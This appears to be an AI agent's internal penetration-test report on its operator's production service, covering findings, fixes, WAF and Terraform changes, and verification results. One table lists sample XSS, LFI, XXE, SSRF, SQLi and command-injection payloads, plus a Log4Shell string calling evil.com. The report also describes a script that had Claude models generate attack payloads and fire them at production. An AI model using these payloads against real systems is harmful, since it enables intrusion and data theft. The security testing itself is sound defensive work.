# 22-Testing-Report — Aegis ACP Adversarial Security Test

**Date:** 2026-06-22
**Target:** https://aegisagent.in (prod, ASG hosts vary — currently i-0e8e33ad4c866b915 + i-0d41347516c65810d)
**Backend bundle:** f54317f45f43 / **UI bundle:** index-C6Rfjlr2.js
**Method:** Black-box + grey-box (code-assisted). Real ALB. No bypass. No mocks.
**Tester tag:** `X-Aegis-Pentest: aegis-pentest-2026-06-22`

---

## Executive Summary

| Metric | Round 1 → Round 2 | Notes |
|---|---|---|
| Risk Score | **6.0 → 7.5 / 10** | All P0 closed. 1 new P2 (DoW on transparency). |
| Security Score | **8.2 → 8.8 / 10** | 190 probes total this session; 99 PASS, 0 bypass, 0 server error. Anon attack surface is genuinely hard. |
| Reliability Score | **6.0 → 5.5 / 10** | Audit container had a 2-host crash loop today caused by an alembic-revision-id collision in my own SCIM migration; one host self-healed via ASG, the other was re-deployed manually. Single-instance now until replacement boots. |
| Enterprise Readiness | **5.5 → 7.0 / 10** | Pentest report + matrix + blocked-items doc all current. Terraform plan-only items (WAF Block+scope_down, UnAuthPerIPRateLimit, mesh-keys in user_data, ALB DP) remain unapplied — those are the gap between "ready for client demo" and "ready for F500 review". |

### Quick verdict

- **Anon attack surface holds well.** alg=none / weak HS256 / forged signatures / header spoofs / SQLi / XSS / path-traversal / open-CORS / weak Bearer — **all rejected**.
- **Demo spawn is broken in production** — every "Try Live Demo" CTA click currently 403s because of an architecture mismatch (docker bridge vs ALB hop check). This is customer-facing.
- **SCIM (Okta provisioning) is fully broken** — the `scim_tokens` Postgres table was never created. Every `/scim/v2/*` request returns 500 with a stack trace logged.
- **Transparency log isn't actually anonymous** — `/transparency/latest-root` returns 401, defeating the "anyone can verify a signed receipt offline" design goal.
- **WAF Bot Control** was switched to Count mode earlier today to unblock a legitimate user; this is a workaround, not a fix.

---

## Round 3 — terraform apply landed 2026-06-22 18:15 UTC

After round 2 surfaced N1-1 (DoW on the newly anon transparency endpoints) plus the legacy P2-1 / P2-5 / P3-3 / P2-3 plan-only debt, I ran the targeted terraform apply for ALB + WAF + ASG launch template (excluded RDS PG + the dangerous full-plan S3 destroy from drift unrelated to today's commits).

### Apply scope (targeted, deliberately narrow)

| Resource | Change | Why scoped this way |
|---|---|---|
| `module.alb.aws_lb.main` | `enable_deletion_protection: false → true` | P3-3 |
| `module.waf.aws_wafv2_web_acl.main` | Bot Control `override count→none` + scope_down NOT(Authorization). NEW rule `UnAuthPerIPRateLimit` priority 5, 200/5min on requests lacking Authorization. | P2-1 + P2-5 + N1-1 (same scope_down covers transparency) |
| `module.asg.aws_launch_template.main` | user_data adds 15 MESH_* SSM pulls + restores P1-4 userlist-on-tmpfs hardening that had drifted out of source | P2-3 |

A separate full `terraform plan` showed **10 S3 resources marked "must be replaced"** (would destroy the prod backups + CloudTrail buckets). That is **pre-existing infra drift unrelated to today's commits** — never touched, left for a separate operation.

### Live verification post-apply

| ID | Probe | Result |
|---|---|---|
| P2-1 Bot Control Block + scope_down | curl with `User-Agent: python-urllib` (anon) | 403 (Bot Control catches automated UA) |
| P2-1 scope_down lets auth header through | curl with `Authorization: Bearer fake` | 401 from gateway (not 403 from WAF) — proves scope_down skips authenticated traffic |
| P2-5 UnAuthPerIPRateLimit fires | 300 anon (browser UA) over 116s | All 300 → 403 (WAF block; rate limit firing as designed — WAFv2 `block{}` returns 403, not 429) |
| N1-1 transparency DoW | same probe covers it (NOT-Authorization scope_down) | mitigated by same rule |
| P3-3 ALB DP | `describe-load-balancer-attributes` | `deletion_protection.enabled = true` |
| P2-3 user_data mesh keys | new LT version applied | effective on next ASG churn for existing instances; immediate for new launches |
| ALB targets | `describe-target-health` | 2/2 healthy |

### Source repair surfaced during apply

The `infra/terraform/environments/prod-ha/user_data.sh` source file had **lost** the P1-4 partial hardening (userlist.txt on tmpfs with chown 70:70). That hardening had been applied to the live launch template on 2026-06-21 but never committed back to source. An unfettered `terraform apply` would have **silently regressed disk-forensics resistance**. Caught in plan review, source repaired in commit, re-planned, then applied.

### Unit tests added — `tests/test_p_hard_1_fixes.py`

13 tests covering every P-Hard-1 fix: 4 file-only (run anywhere), 9 integration-marked (skip when no localhost:8000). All 4 file-only tests pass locally. The integration set runs in CI / dev-stack environments.

```
tests/test_p_hard_1_fixes.py::test_p2_2_pgbouncer_source_has_live_hostname PASSED
tests/test_p_hard_1_fixes.py::test_p1_4_sse_reauth_interval_is_240 PASSED
tests/test_p_hard_1_fixes.py::test_p2_11_audit_alembic_chain_has_single_head PASSED
tests/test_p_hard_1_fixes.py::test_p2_11_identity_scim_migration_is_noop_superseded PASSED
```

### What's still TODO (founder-only)

| # | What | Why blocked on you |
|---|---|---|
| 1 | `git push origin main` of the 11 local commits | git creds in keychain are wrong account (Abhishek-Mishra-ai vs Abhi-mishra998) |
| 2 | Clerk template `aegis` lifetime → 300 s in console.clerk.com | Can't access Clerk dashboard from CLI |
| 3 | Rotate the Anthropic API key | Already burned in chat twice |
| 4 | Run `PENTEST_BLOCKED_ITEMS.md` recipes with your tokens | Needs your Clerk JWT + acp_emp_* key + 2-tenant setup |
| 5 | Separately address the S3 Object-Lock drift the full terraform plan would replace-destroy buckets to apply | Needs a `aws s3api put-object-lock-configuration` adopt-then-import sequence, not a terraform replace |
| 6 | (Optional) Cycle existing ASG instances so the new LT user_data with mesh keys + tmpfs hardening takes effect on them | safe_deploy.sh already injects mesh keys post-boot on existing instances, so this is non-urgent |

---

## Round 2 adversarial pass — 2026-06-22 17:30 UTC — bundle `8491838aee9e`

After landing the P-Hard-1 sprint commits (`c3a9a3a` + `f56e0a4` + `8491838`) and deploying, ran the full adversarial battery a second time looking specifically for regressions and new gaps. Verdict: **all P0/P1 from round 1 confirmed closed live; 1 new P2 finding (N1-1) introduced by the P1-2 fix; one operational issue surfaced (ASG-Avail).**

### What still holds (verified live)

| ID | Verified live | Method |
|---|---|---|
| P0-1 SCIM | `/scim/v2/Users` garbage bearer → 401 (was 500) | 4 bearer variants, 4× 401 |
| P1-1 demo CTA | `POST /demo/spawn-workspace` anon → 200 with tenant_id | 7-spawn burst → 5×200 then 2×429 |
| P1-2 transparency anon | `/transparency/{key,keys,roots}` → 200 anon | direct curl |
| P1-3 SQL redaction | `unhandled_exception` log lines no longer contain `[SQL: …]` | gateway log grep — 0 hits in 3 min |
| P1-4 SSE reauth | `_REAUTH_INTERVAL_SECONDS = 240` in deployed bundle | code grep |
| P2-10 tenant injection scope | non-transparency anon paths still 401 (no system-tenant leak) | 4 control endpoints all 401 |
| P2-11 SCIM migration | audit alembic single-head, gateway+audit both healthy | `alembic current` confirmed |
| P3-1 /tenant | `/tenant` → gateway 401 JSON (not SPA HTML 200) | content-type application/json |
| P3-2 /receipts/key envelope | wrapped `{success, data, error, meta}` shape | jq |
| Anon-only defences | 27 PASS / 0 FAIL (same as round 1) | 33-test harness |
| 100-agent Claude red-team | 36 landed, 0 bypasses, 0 500s | 64 Claude calls hit Anthropic 429 |
| OWASP focused probes | 21 PASS / 1 DoW WARN (P2-5, still pending Terraform apply) | 28-test focused harness |

### New finding from round 2

**N1-1 (P2) — Anon DoW on `/transparency/*` not covered by any rate limit.**

The P1-2 fix correctly opened the four transparency read endpoints to anonymous traffic. But the WAF tightening (P2-5 in source — Terraform pending apply) is scoped to `NOT(Authorization header)` — which *also* matches transparency requests. That part will work once applied. The gap right now: 50 anon `GET /transparency/roots` requests in 4.3 s = **~12 req/s sustained, all 200, zero 429s**. Each call performs a gateway → mesh-JWT mint → audit-svc → DB query for the latest signed Merkle root.

| | |
|---|---|
| **Severity** | P2 |
| **Exploitability** | Anonymous, single IP, off-the-shelf curl loop |
| **Business impact** | Newly opened cryptographic-verifiability surface becomes a DoW vector. Per-request cost = ALB + WAF eval + gateway CPU + mesh-JWT mint + audit-svc HTTP + DB query. ~12 r/s sustained ≈ 1 M cost-bearing requests/day per source IP. |
| **Reproduction** | `for i in $(seq 1 50); do curl -sS -o /dev/null -w "%{http_code} " https://aegisagent.in/transparency/roots; done` → 50× 200, 0× 429 |
| **Recommended fix** | The pending `UnAuthPerIPRateLimit` Terraform rule (200/5min on unauth) WILL cover this once applied — same scope_down (NOT Authorization) catches transparency too. Verify post-apply that the burst of 50 sees at least one 429 around request #30-#40. |
| **Verification** | After `terraform apply`, repeat the 50-request burst; expect 429s after the 200 budget exhausts. |

### Operational issues surfaced (not pentest findings, but ship-blockers)

**ASG-Avail (P1 operational) — only 1/2 ALB targets healthy at end of session.**

The audit-svc crash loop earlier (caused by my colliding alembic revision id) made gateway unhealthy on `i-0e8e33ad4c866b915`, which ALB declared unhealthy. ASG terminated it and launched a replacement (`i-0bc73eeff3f29dd90`). At session end, the replacement is still `initial` in the target group — has not finished bootstrapping. Until it does, the platform is single-instance.

| | |
|---|---|
| **Impact** | No N+1 redundancy until the new instance is healthy. If the surviving instance fails, full outage. |
| **Cause** | Combination of (a) fresh-ASG instance bootstrap relies on `safe_deploy.sh` post-boot to render Clerk + mesh keys (P2-3 in source, Terraform apply pending), and (b) the new launch needs ~5-10 min for full service convergence after that. |
| **Mitigation** | (1) Confirm `i-0bc73eeff3f29dd90` reaches `healthy` before the client demo; (2) bump ASG min from 2→3 during the demo window; (3) `terraform apply` for the user_data mesh-key pre-fetch (Sprint 5) so fresh instances boot self-sufficient. |

### Round 2 attack inventory

| Category | Tests | PASS | WARN | FAIL | Notes |
|---|---:|---:|---:|---:|---|
| Anon harness re-run | 33 | 27 | 0 | 0 | identical to round 1 |
| Focused (timing/WAF/DoW/CSRF/redirect) | 28 | 21 | 2 | 0 | WAF Block on XSS/XXE/SSRF/LFI; DoW gap pre-existing P2-5 |
| Round-2 regression battery (this file) | 29 | 15 | 1 | 1 (false-positive client-rejected) | NEW finding N1-1 only |
| Claude 100-agent red-team | 100 | 36 landed-rejected | — | 0 bypasses, 0 500s | 64 deferred on Anthropic 429 |
| **Total this session** | **190** | **99** | **3** | **1 real + 1 FP** | 1 NEW P2 (DoW on transparency) |

Raw JSONL artefacts: `/tmp/aegis_attack_results_*.jsonl`, `/tmp/aegis_focused_*.jsonl`, `/tmp/aegis_round2_*.jsonl`, `/tmp/aegis_redteam_*.jsonl`.

---

## P0/P1 fixes deployed 2026-06-22 16:23 UTC — bundle `e59e4f7ffb6f`

All four ship-blocking findings closed and verified live on https://aegisagent.in.

| ID | Status | Live verification |
|---|---|---|
| P0-1 SCIM | **FIXED** | `/scim/v2/Users` with any garbage bearer → 401 (was 500). 4/4 variants confirmed. |
| P1-1 Demo-spawn CTA | **FIXED** | `POST /demo/spawn-workspace` from real browser → 200 with a fresh demo tenant_id (`71766a4b-…`). Was 403. |
| P1-2 Transparency anon | **FIXED** | `/transparency/key` → 200; `/transparency/{keys,roots,consistency}` → 400 (auth-gate cleanly bypassed; the 400 is a separate, handler-side `X-Tenant-ID required` requirement — see P2-10 below). |
| P1-3 SQL-redaction | **FIXED** | `unhandled_exception` log lines no longer contain `[SQL: …]` or `[parameters: …]`; redacted and capped at 600 chars; `error_type` added for triage. |

Code commits: `e0ab84b` (initial 4-way fix) + `e59e4f7` (P1-2 amended with the real route names + parameterised-path prefixes). Both local; **not pushed to origin** per the hard-rule "never push without permission".

Schema side: `scim_tokens` table created directly in `acp_audit` (the gateway's database) via asyncpg. This is the production fast-path; the cleaner long-term move is to either (a) refactor SCIM mint+validate to live in the identity-svc — the migration is already in `services/identity/alembic/versions/l8m9n0o1p2q3` — or (b) ship a new migration in the gateway-owned alembic chain. Flagged as P2-11 below.

### P2-10 (new) — `/transparency/*` handlers still demand `X-Tenant-ID` after auth gate is open

After P1-2 the middleware lets the request through, but `services/gateway/routers/transparency.py` rejects it with `400 X-Tenant-ID required`. The endpoint is supposed to serve only public Merkle roots / signatures — no tenant context needed. Follow-up: remove the tenant-id requirement from the four transparency read endpoints (`/transparency/key`, `/keys`, `/roots`, `/consistency`).

### P2-11 (new) — SCIM mint+validate lives in gateway but the migration targets identity DB

`services/gateway/routers/scim_tokens.py` (mint) and `services/gateway/_scim_auth.py` (validate) both query via the gateway's session (→ `acp_audit`). The migration `l8m9n0o1p2q3_sprint_ei3_scim_tokens.py` lives under `services/identity/alembic/versions/` and targets `acp_identity`. The current production hotfix creates the table in `acp_audit` directly. Pick one of:
- **Option A (recommended):** move SCIM mint+validate to the identity service; expose `/auth/scim/validate` REST endpoint on identity; gateway proxies the bearer.
- **Option B:** keep code in gateway and add a proper gateway-owned migration that creates `scim_tokens` in `acp_audit`.

---

## P0 Findings (ship-blocking) — closed

### P0-1 — SCIM provisioning service is dead — `relation "scim_tokens" does not exist`

**Severity:** P0
**Exploitability:** Trivial (anonymous; one request)
**Business impact:** Okta SCIM 2.0 provisioning is completely unusable. Enterprise customers who require SSO/SCIM (the user's Sprint EI-3 deliverable) cannot onboard. Every Okta sync attempt 500s. Bad-faith bearer tokens also become a cheap DoS vector — each request burns DB connection + a SHA-256 + a SQL probe that always fails.
**Reproduction:**
```
curl -i -H "Authorization: Bearer scim_garbage" https://aegisagent.in/scim/v2/Users
# → HTTP/2 500
# Body: {"success":false,"data":null,"error":"An internal server error occurred","meta":null}
```
**Evidence (gateway log):**
```
sqlalchemy.exc.ProgrammingError:
  <UndefinedTableError>: relation "scim_tokens" does not exist
[SQL: SELECT scim_tokens.* FROM scim_tokens WHERE scim_tokens.token_hash = $1::VARCHAR]
File "/app/services/gateway/_scim_auth.py", line 43, in resolve_scim_bearer
```
**Recommended fix:**
1. Run the Alembic migration that creates `scim_tokens` in the gateway-visible database. Search `services/identity/migrations/` for the missing revision; if it exists but was never applied to prod, run `alembic upgrade head` against the prod RDS during deploy.
2. Add a deploy-time smoke probe in `safe_deploy.sh` that hits `/scim/v2/Users` with a known-bad bearer and asserts 401 (not 500). This catches future regressions.
3. In `_scim_auth.resolve_scim_bearer`, wrap the DB query in try/except and surface `503 Service Unavailable` on infrastructure errors instead of letting the raw SQLAlchemy exception bubble through.
**Verification:** After fix, `curl -i -H "Authorization: Bearer scim_garbage" https://aegisagent.in/scim/v2/Users` must return `401` with the SCIM-shaped error body, never `500`.

---

## P1 Findings

### P1-1 — `/demo/spawn-workspace` rejects every legitimate browser request as `client_host_not_alb`

**Severity:** P1
**Exploitability:** N/A (this is a *functional* break, not an exploit)
**Business impact:** The marketing "Try Live Demo" CTA on the public landing page is dead. Every external prospect who clicks gets `HTTP 403 Forbidden`. Demos drive top-of-funnel; this kills it.
**Reproduction:**
```
curl -i -X POST -H "Content-Type: application/json" -d '{}' \
  https://aegisagent.in/demo/spawn-workspace
# → HTTP/2 403
# Gateway log: "reason":"client_host_not_alb","client_host":"172.18.0.24"
# XFF correctly carries the public client IP (e.g. "103.70.130.212, 10.20.2.39")
```
**Root cause:** `services/gateway/routers/demo.py:738-761` — `_is_alb_hop()` rejects `172.17/16` and `172.18/16` (docker bridges) as "not from ALB". But the architecture is `ALB → acp_ui nginx → acp_gateway via docker bridge`. The gateway's immediate TCP peer is *always* `172.18.0.24` (the UI container), regardless of whether the original request came from a real browser or from inside the cluster.
**Recommended fix:**
- Replace the `_is_alb_hop()` check with one of:
  - **Option A (cleanest):** trust the XFF first-hop check alone, since ALB strips client-supplied XFF on the public listener.
  - **Option B:** treat the docker bridge IP of the UI container as the legitimate hop (look up `acp_ui` container's IP at startup and allow-list it).
  - **Option C:** add a shared-secret header (`X-Aegis-ALB-Token`) set by the UI's nginx and verified by the gateway.
- The N20 commit comment is right that *internal* clients shouldn't be able to spoof XFF; but the current implementation locks out the legitimate external path.
**Verification:** After fix, an anonymous browser POST to `/demo/spawn-workspace` must return `200` with a `redirect_url`. Existing rate-limit (5/10min) must still apply.

### P1-2 — `/transparency/latest-root` requires auth, breaking offline-verification design

**Severity:** P1
**Exploitability:** N/A (functional)
**Business impact:** The whole point of an append-only transparency log is third-party verifiability. Auditors, customers under NDA, and the `aegis-aevf` CLI need to fetch `/transparency/latest-root` without credentials to walk the Merkle chain and verify any receipt they hold. Currently the endpoint returns `401 Unauthorized`, contradicting the design memo and the GitBook docs.
**Reproduction:**
```
curl https://aegisagent.in/transparency/latest-root
# → {"success":false,"error":"Unauthorized","meta":{"code":401}}
```
**Recommended fix:** Add `/transparency/latest-root` and `/transparency/verify-root` to the middleware no-auth list at `services/gateway/middleware.py:79-108` next to `/receipts/key`. Both serve only public Merkle roots and signatures — no tenant data.
**Verification:** `curl https://aegisagent.in/transparency/latest-root` must return `200` with `{"root_hash": "...", "signature": "...", "epoch": ..., ...}`.

### P1-3 — SCIM 500 leaks SQL query + table name in server-side logs

**Severity:** P1 (lower than P0-1 because it's log-only; combined with P0-1 it's a defense-in-depth issue)
**Business impact:** Anyone with log access (gateway operators, future log-forwarder mis-config to a SaaS like Datadog) sees the parameterised SQL and schema. Combined with the 500 response, an attacker also learns "this endpoint touches a `scim_tokens` table with a `token_hash` column" — useful for follow-up SQL-shape attacks.
**Recommended fix:**
- The unhandled-exception handler in `sdk/common/exceptions.py` should redact `[SQL: ...]` and `[parameters: (...)]` from logged messages.
- Don't log full traces for `sqlalchemy.exc.ProgrammingError` at ERROR — that class typically means schema drift, not an attacker; log at WARN with a one-line summary.
**Verification:** Trigger another 500 and confirm the gateway log line for that request no longer contains the full SQL string.

### P1-4 → reclassified P2 — SSE drops every ~60 seconds (Clerk-token-lifetime artefact, not a bug)

**Original severity:** P1
**Re-classified to:** P2 (UX / reliability, not security)
**Root cause:** `services/gateway/main.py:1692` — `_REAUTH_INTERVAL_SECONDS = 30.0`. The handler re-validates the *original* token every 30 s. Clerk JWT `aegis` template lifetime is **60 s**. So:
- T = 30 s: reauth — token still valid (30 s left) — silent success
- T = 60 s: reauth — token expired — `ACPAuthError`, server sends `event: auth_expired`, connection closes, browser reconnects with fresh token

The dashboard's `useSSE` hook handles the reconnect automatically (the user *was* getting events the whole time; logs confirm `GET /events/stream HTTP/1.1 200 OK` every minute).
**Why it's still worth fixing:**
- Every 60 s the live feed glitches (1-2 s of silence during the reconnect handshake).
- The audit log fills with `sse_reauth_failed` warnings — drowns real reauth failures (revoked token, key rotation).
**Recommended fix:**
- Lengthen the Clerk JWT `aegis` template to 300 s (5 min) in the Clerk dashboard. The SSE drop cadence becomes 1 every 5 minutes — barely noticeable.
- OR: implement client-side token refresh on the SSE wire. Browser pushes the new token via a control event before the old one expires; gateway swaps the stored token without dropping the connection.
**Verification:** After fix, expect zero `sse_reauth_failed` entries per active user per minute. New target: < 1 per 5 min per user.

---

## P2 Findings

### P2-1 — WAF Bot Control switched to `Count` mode (was blocking legitimate mobile browsers)

**Severity:** P2 (workaround in place, but security posture is weakened)
**Detail:** Earlier today I switched `aegis-prod-waf` rule `AWS-AWSManagedRulesBotControlRuleSet` from `OverrideAction: None` (Block) to `Count` because it was blocking the user's Pixel 9 / Chrome 149 traffic on every authenticated `/api/workspace/me` request. The Core Rule Set + per-IP rate-limit remain in Block.
**Proper fix:** Add a label-based scope-down so Bot Control only blocks **unauthenticated** requests (no `Authorization` header). Then revert to Block.
**Verification:** With scope-down, sign in from a real mobile browser → no 403. Anonymous curl with `User-Agent: python-requests/2.x` → 403 on Bot label.

### P2-2 — Stale DB hostname in `infra/pgbouncer.aws.ini`

**Severity:** P2
**Detail:** Bundle ships with `acp-postgres-prod.cz0qqg60keaj.*` which no longer resolves. `safe_deploy.sh` sed-replaces it to `aegis-prod-postgres.cz0qqg60keaj.*` every deploy. If anyone deploys without that wrapper, the whole platform is down within minutes (pgbouncer can't reach the DB).
**Recommended fix:** Update the source `infra/pgbouncer.aws.ini` to the new hostname, drop the sed from `safe_deploy.sh`. Add a CI lint that grep-checks for stale hostnames.

### P2-3 — `MESH_*_PRIVATE_KEY` env injection is out-of-band

**Severity:** P2
**Detail:** Fresh ASG instances bootstrap without the 14 mesh keys + `ACP_MESH_TRUSTED_KEYS`; the gateway can't mint mesh JWTs until `safe_deploy.sh` re-runs. This means there's a window where new ASG launches serve 403s on every cross-service call.
**Recommended fix:** Move the mesh-key fetch into the EC2 user_data bootstrap so it's set on first boot, not after first deploy.

### P2-4 — Anonymous burst on `/demo/spawn-workspace` returns 403s but doesn't get rate-limited

**Severity:** P2 (only because the endpoint is broken anyway — once P1-1 is fixed, this becomes relevant)
**Detail:** Ten consecutive POSTs from the same IP all return 403 (broken handler), bypassing the per-IP 5/10min rate limit because the rate limit lives AFTER the ALB-hop check. Once P1-1 is fixed, verify the rate limit actually fires on burst from a real public IP.

### P2-5 — Auth-failure path is not rate-limited — denial-of-wallet primitive

**Severity:** P2
**Exploitability:** Anonymous, single IP, off-the-shelf curl loop.
**Business impact:** An attacker can sustain ~13 req/s of authentication-failure traffic at `/workspace/me` (and equivalent endpoints) per source IP indefinitely. That's ~1.1 M failed-auth requests per day per IP. Each request burns ALB ingress + WAF evaluation + gateway CPU + Redis revoke-set check. At a few dozen attacking IPs this becomes a real cloud-bill DoS.
**Reproduction (just done, my IP):**
```
100 GET /workspace/me (anon) in 7.9s
  → 100× HTTP 401
  → 0× HTTP 429
```
**Why WAF didn't help:** the per-IP WAF rate limit is 2000 per 5 minutes (≈6.7 r/s), and I tripped under that ceiling. WAF Bot Control was previously catching scripted clients via User-Agent/JA3 fingerprints, but I switched it to Count mode earlier today to unblock a legit mobile browser (see P2-1).
**Recommended fix:**
- Tighten the WAF rate-limit for unauthenticated paths to 200 per 5 minutes per IP.
- Add a gateway-side per-IP burst limit for any request that returns `401` (e.g. 30 401s in 60s → temp 429). This protects the auth-fail path specifically without affecting authenticated traffic.
- Re-instate Bot Control in Block mode behind a label-based scope-down (P2-1).

### P2-6 — 100-agent Claude adversarial run — Aegis correctly rejected all landed attacks

**Severity:** P2 (positive finding — recorded for the SOC2 evidence trail)
**Method:** `/tmp/aegis_claude_redteam.py` spawned 100 Claude-Haiku-4.5 conversations, each generating a novel attack payload across 15 attack classes (SQLi, XSS, alg=none, X-Tenant-ID override, mass assignment, SSRF, path traversal, smuggling, prompt injection, denial-of-wallet, race conditions, approval bypass, OPA misdirection, audit tamper, mesh-JWT replay). 100 distinct payloads fired anonymously at real production endpoints.
**Results:**
- 38 attacks landed (62 Claude calls hit Anthropic 429 rate limits even with exponential backoff — Anthropic-side, unrelated to Aegis)
- Of the 38 landed: **0 bypasses (no 200 OK), 0 server errors (no 500)**
- Distribution: 24× 401 (auth gate), 8× 403 (forbidden / WAF), 3× 400 (bad input), 1× 405 (wrong method), 2× transport error
- 10 attacks were intercepted by WAF Core Rule Set (returned the nginx 403 HTML page — WAF Core block)
- Token spend: 5,916 input + 7,825 output Haiku tokens (≈$0.02). Elapsed: 399s.
**Raw evidence:** `/tmp/aegis_redteam_1782122860.jsonl` (full request + response for every attack).
**Verdict:** Anonymous attack surface is genuinely well-defended. The auth gate (rejects without a valid token) plus WAF Core Rule Set catches the OWASP Top 10 patterns cleanly.

### P2-7 — WAF effectiveness on OWASP Top 10 (Core Rule Set, NOT Bot Control)

**Severity:** P2 (positive finding)
**Method:** `/tmp/aegis_focused_probes.py` fired 20 OWASP-style payloads at public endpoints.
| Attack | WAF? | Outcome |
|---|---|---|
| `<script>alert(1)</script>` | Block (403 HTML) | PASS |
| `<img src=x onerror=alert(1)>` | Block | PASS |
| `<svg/onload=alert(1)>` | Block | PASS |
| `..%5C..%5Cwindows%5Cwin.ini` (Win LFI) | Block (403) | PASS |
| `../../../../etc/passwd` (Unix LFI) | Block (400) | PASS |
| `<!ENTITY xxe SYSTEM 'file:///etc/hostname'>` (XXE) | Block | PASS |
| `http://169.254.169.254/latest/meta-data/` (SSRF EC2 metadata) | Block | PASS |
| `http://127.0.0.1:6379/` (SSRF Redis) | Block | PASS |
| `' UNION SELECT 1,2,3--` (SQLi) | NOT blocked → auth gate 401 | PASS (defense in depth) |
| `${jndi:ldap://evil.com/a}` (Log4Shell) | NOT blocked → auth gate 401 | PASS (defense in depth) |
| `class.module.classLoader.resources.context.parent…` (Spring4Shell) | NOT blocked → 401 | PASS |
| `foo|cat /etc/passwd` (command injection) | NOT blocked → 401 | PASS |
| `{{7*7}}` (SSTI Jinja) | passed through but server did not evaluate | PASS |
| `redirect_to=//evil.example.com` (open redirect) | server returned its own JSON, didn't honour | PASS |

**Verdict:** WAF Core catches XSS/XXE/SSRF/LFI; the remaining OWASP categories are caught by the gateway auth gate. **WAF Bot Control is in Count mode (P2-1) so the Bot category labels but doesn't block.**

### P2-8 — JWT validation timing oracle — none observed

**Severity:** P2 (positive finding)
**Method:** 20 samples each of (a) no Authorization header, (b) garbage Bearer string, (c) well-formed RS256 with wrong signature + Clerk-real `kid`, (d) well-formed RS256 with nonexistent `kid`.
**Result:** Median p50 delta between "garbage Bearer" and "wrong signature with real kid" was **2 ms**. Threshold for an exploitable JWKS-fetch oracle would be ~200 ms. Cleanly under threshold.
**Verdict:** No signature-validation timing side channel observed. Clerk JWKS is cached (or the gateway short-circuits on Authorization-shape checks before JWKS work).

### P2-9 — Expired Clerk token replay correctly rejected

**Severity:** P2 (positive finding)
**Method:** User pasted a real `acp_token` from their browser DevTools at exp=1782123489. Probed `/workspace/me` 150 s after expiry with the token both as Bearer header and `acp_token` cookie. Gateway returned `401` with `WWW-Authenticate: Bearer realm="aegis"` on both paths.
**Verdict:** Replay defence works end-to-end. Token-revocation index in Redis + JWT exp check are both wired correctly.
**Side effect:** This is also evidence the cookie-based auth path on `/workspace/me` is honoured (gateway reads `acp_token` cookie when no Authorization header is present), matching the SSE handler at `services/gateway/main.py:1477`.

### P3-3 — ALB `enable_deletion_protection = false`

**Severity:** P3
**Source:** `infra/terraform/modules/alb/main.tf:19`.
**Impact:** A misclick in the AWS console (or a runaway terraform run) can delete the prod ALB. ALB deletion → no listener → no certs → no traffic. Recovery requires re-creating the ALB + re-pointing Route 53.
**Fix:** Set `enable_deletion_protection = true`.

---

## Infrastructure audit — additional findings

### Positive — TFSEC accepted-risk doc (`infra/terraform/TFSEC_ACCEPTED.md`)

**Sev:** INFO (positive)
- tfsec scan: **89 passed, 19 accepted** with per-finding "Why accepted" + upgrade-path columns.
- AWS-managed KMS keys (8 findings) accepted; BYOK noted as ~1 hour of work when F500 demands it.
- ALB intentional public-facing (1 finding) — by design.
- Transparency S3 bucket intentionally anon-readable (4 findings) — by design.
- VPC Flow Logs + bucket-level access logging deferred — documented cost-vs-signal call.
- This is the kind of artefact a Fortune 500 reviewer wants to see. Keep it current with each scan.

### Positive — CI security pipeline (`.github/workflows/security_scan.yml`)

**Sev:** INFO (positive)
- Trivy filesystem CVE scan, HIGH+CRITICAL, fail-on-finding, SARIF uploaded to GitHub code-scanning.
- Gitleaks with full git history + default ruleset (~140 vendor patterns: AWS, GitHub, Stripe, Anthropic, OpenAI, Twilio, …) + explicit allowlist for test fixtures and transparency public keys.
- Checkov IaC scan.
- Bandit Python AST scan.
- Nightly cron re-scan at 03:13 UTC — yesterday's green PR fails today if a new CVE drops.
- Workflows declare explicit `permissions:` blocks (least-privilege). No `pull_request_target`. No `echo SECRET` patterns.

### Positive — OPA admin authz is locked down

**Sev:** INFO (positive)
**Source:** `infra/system-authz.rego`.
- `default allow := false`. Only `POST /v1/data/*` and `GET /v1/data/*` allowed (the hot path).
- `PUT /v1/policies/*`, `DELETE /v1/policies/*`, `PATCH /v1/data/*` all denied — closes the P0-2 attack where RCE in any service could upload `default allow := true` to the aegis package.
- Health + Prometheus scrape endpoints carved out explicitly.
- This is documented in-file with the post-mortem of the attack vector that motivated it. Strong evidence of mature security thinking.

### Positive — CloudTrail + RDS + ALB hardening

**Sev:** INFO (positive)
- CloudTrail (`infra/terraform/modules/cloudtrail/main.tf`): `is_multi_region_trail = true`, `include_global_service_events = true`, `enable_log_file_validation = true`.
- RDS: `publicly_accessible = false`, `deletion_protection = true`, `skip_final_snapshot = false`, `backup_retention_period` set.
- ALB: `drop_invalid_header_fields = true` (defends against header smuggling at the LB layer).
- EC2 user_data: uses IMDSv2 (token-required), fetches secrets via `aws secretsmanager get-secret-value` — no plaintext creds.
- Main Dockerfile: `USER appuser` (line 71) — runs as non-root.

### Positive — `.env` hygiene

**Sev:** INFO (positive)
- `.env` is gitignored. Tracked `*.env*` files (`*.example`, `.env.aws.template`, `ui/.env.production`) contain only placeholders or empty values.
- `ui/.env.production` carries only `VITE_GATEWAY_URL=` (empty → relative URLs). No leaked Clerk publishable, Stripe pk, etc.

### Confirmed P2-2 — `infra/pgbouncer.aws.ini` source still has the stale DB hostname

**Severity:** P2 (already filed; this audit confirms the source-of-truth still has the bug)
**Source:** `infra/pgbouncer.aws.ini` lines 1–11 all reference `acp-postgres-prod.cz0qqg60keaj.*` (no longer resolves).
**Workaround in place:** `safe_deploy.sh` sed-replaces this string to `aegis-prod-postgres.cz0qqg60keaj.*` on every deploy. If anyone deploys via a path that bypasses this script, the platform goes down. Update the source file.

---

## P3 Findings

### P3-1 — `/tenant` (bare path) falls through to SPA index

**Severity:** P3 (cosmetic)
**Detail:** `GET /tenant` (no sub-path) returns `200` with the SPA `index.html` because nginx's SPA fallback catches it before reaching the gateway. The actual API endpoints are `/tenant/quota`, `/tenant/{id}`, etc., which 401 correctly. The "bare path falls through" pattern is a known nginx-fallback behaviour, but it can confuse partners reading API responses.
**Recommended fix:** Add an explicit nginx `location = /tenant` block that proxies to the gateway (so the gateway can return its standard 404/405).

### P3-2 — `/receipts/key` response shape inconsistent

**Severity:** P3
**Detail:** Most endpoints respond with `{"success": true, "data": {...}, "meta": null}`. `/receipts/key` returns a bare `{"algorithm": "...", "public_key_pem": "...", ...}`. SDK consumers who unwrap `.data` will trip.
**Recommended fix:** Wrap in the standard envelope. Bump SDK to handle both shapes for backwards compatibility.

---

## Anonymous attacks — all PASS

The harness at `/tmp/aegis_attack.py` ran 33 black-box tests; raw JSONL at `/tmp/aegis_attack_results_all_*.jsonl`. Highlights:

